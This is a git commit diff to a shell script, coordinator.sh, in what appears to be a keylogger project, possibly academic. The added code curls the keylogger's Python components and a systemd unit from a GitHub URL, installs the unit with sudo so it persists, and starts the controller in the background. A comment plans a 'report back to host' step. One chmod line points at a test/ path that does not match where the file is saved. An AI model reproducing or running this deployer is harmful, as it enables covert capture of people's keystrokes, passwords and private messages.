139bf985ab75a65852f6849dfa2ea55c332b81e0
Sam Castle <castles2@vcu.edu>
2023-04-18 10:47:10 -0400

    included checks, downloads, and run app

--- src/coordinator.sh
+++ src/coordinator.sh
@@ -12,16 +12,41 @@ sudo mkdir /nicekl && cd /nicekl/
 
 # DOWNLOAD FILES if they are not already installed
 # nicekeylogger.service, controller.py, find_keyboard.py, keymap.py
-
+CONT=controller.py
+KMAP=keymap.py
+FKEY=find_keyboard.py
+KLSERV=nicekeylogger.service
+if test -f "$CONT" ; then
+  true
+else
+  curl https://raw.githubusercontent.com/castle-sam/nice-keylogger/feature-bash-coordinator/src/controller.py > controller.py
+fi
+if test -f "$KMAP" ; then
+  true
+else
+  curl https://raw.githubusercontent.com/castle-sam/nice-keylogger/feature-bash-coordinator/src/keymap.py > keymap.py
+fi
+if test -f "$FKEY" ; then
+  true
+else
+  curl https://raw.githubusercontent.com/castle-sam/nice-keylogger/feature-bash-coordinator/src/find_keyboard.py > find_keyboard.py
+fi
+if test -f "$KLSERV" ; then
+  true
+else
+  curl https://raw.githubusercontent.com/castle-sam/nice-keylogger/feature-bash-coordinator/src/nicekeylogger.service > nicekeylogger.service
+fi
+sudo chmod 744 test/controller.py
 
 # SET APPLICATION AS A SERVICE WITH SYSTEMD
 # copy nicekeylogger.service to /etc/systemd/system/
+sudo mv nicekeylogger.service /etc/systemd/system/
 systemctl enable nicekeylogger.service
 systemctl daemon-reload
 
 
 # RUN APPLICATION
-
+python3 controller.py &
 
 # REPORT BACK TO HOST
 # TODO - decide the period to report back
